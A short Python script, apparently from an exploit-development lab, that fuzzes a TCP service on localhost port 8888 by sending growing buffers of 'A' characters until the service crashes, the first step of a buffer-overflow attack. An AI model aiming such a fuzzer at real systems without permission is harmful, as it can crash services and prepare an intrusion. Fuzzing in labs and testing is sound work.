import socket

TARGET_IP = "127.0.0.1"
TARGET_PORT = 8888

size = 100

while size < 3000:

    print("\n[+] Sending {} bytes".format(size))

    raw_input("[*] Press Enter to continue...")

    try:
        payload = "A" * size

        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((TARGET_IP, TARGET_PORT))
        client.send(payload)
        client.close()

        size += 100

    except:
        print("[!] Crash around {} bytes".format(size))
        break
